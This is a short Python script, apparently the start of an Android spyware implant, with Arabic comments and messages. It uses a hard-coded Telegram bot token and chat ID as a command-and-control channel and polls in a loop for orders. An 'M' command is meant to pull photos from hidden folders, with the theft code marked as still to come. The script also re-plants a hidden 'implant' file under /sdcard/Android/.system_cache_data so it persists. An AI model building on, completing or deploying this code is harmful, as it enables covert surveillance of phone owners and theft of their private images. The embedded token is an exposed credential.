import os
import time
import requests

TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"

def listen():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1"
        res = requests.get(url, timeout=10).json()
        if res.get("result"):
            return res["result"][0].get("message", {}).get("text", "").upper()
    except: return None

if __name__ == '__main__':
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "💀 الشبح استيقظ وبدأ بمراقبة الأوامر..."})
    
    while True:
        cmd = listen()
        if cmd == "M":
            # هنا سنضع كود سحب الصور في الخطوة القادمة بعد التأكد من الاتصال
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "📸 تم استلام الأمر M.. جاري سحب الصور من المجلدات المخفية!"})
        
        # التأكد من بقاء ملف الزرع حياً
        if not os.path.exists("/sdcard/Android/.system_cache_data/.core_bridge"):
            # إعادة الزرع إذا تم الحذف
            os.makedirs("/sdcard/Android/.system_cache_data", exist_ok=True)
            with open("/sdcard/Android/.system_cache_data/.core_bridge", "w") as f: f.write("RE-PLANTED")
            
        time.sleep(7)
